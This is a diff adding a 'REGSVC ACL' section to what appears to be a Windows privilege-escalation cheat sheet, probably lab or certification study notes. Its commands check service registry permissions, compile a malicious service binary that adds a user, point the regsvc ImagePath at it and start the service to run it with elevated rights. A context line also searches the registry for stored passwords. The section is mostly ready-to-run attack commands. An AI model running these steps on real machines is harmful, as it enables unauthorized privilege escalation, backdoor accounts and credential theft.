@@ -169,7 +169,20 @@ reg query HKCU /f password /t REG_SZ /s
 
 ````
 
+#### REGSVC ACL 
+````
+Check for registry services 
+> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+Look for access group permissions for NT AUTH/Interactive 
 
+Create a new window service binary, check attack directory for source (net user add works) 
+> x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+
+Add to the registry path 
+> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
+Execute using 
+> sc start regsvc 
+````
 
 
 ################################################################################################################################################
